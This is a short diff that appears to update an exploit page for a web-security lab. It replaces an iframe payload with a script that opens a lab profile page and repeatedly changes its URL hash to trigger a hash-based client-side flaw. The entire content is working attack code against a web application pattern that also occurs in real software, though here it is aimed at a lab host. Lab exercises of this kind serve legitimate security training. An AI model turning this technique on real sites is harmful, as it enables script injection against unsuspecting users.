@@ -1,1 +1,18 @@
-<iframe src="https://8369789ec15a.pwnbox-lab.com/profile/demo" onload=this.src+='#'></iframe>
+<!doctype html>
+<script>
+const target = "https://e95c6f311b8a.pwnbox-lab.com/profile/demo";
+
+const w = open(target + "#initial");
+
+let i = 0;
+const id = setInterval(() => {
+  if (!w || w.closed) {
+    clearInterval(id);
+    return;
+  }
+
+  w.location = target + "#pwn";
+}, 500);
+
+setTimeout(() => clearInterval(id), 8000);
+</script>
